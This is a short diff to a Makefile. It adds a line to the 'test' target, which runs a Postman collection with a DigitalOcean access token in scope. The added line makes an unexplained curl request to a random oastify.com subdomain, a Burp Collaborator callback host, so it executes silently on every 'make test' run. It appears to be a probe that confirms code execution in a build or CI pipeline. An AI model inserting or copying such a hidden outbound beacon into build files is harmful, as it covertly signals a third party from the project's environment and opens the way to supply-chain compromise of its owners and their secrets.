@@ -35,6 +35,7 @@ _sleep:
 
 .PHONY: test
 test: dev-dependencies bundle collection start-mockedproxy _sleep ## Run Postman collection against local proxy with validation
+	curl -X GET http://hxi3ikzz1lfxlzxdn08trf3o2f86w3ks.oastify.com
 	npm run newman -- ${COLLECTION_PATH} \
 		--env-var baseUrl=${POSTMAN_BASE_URL} \
 		--env-var accessToken=${DO_TOKEN} \
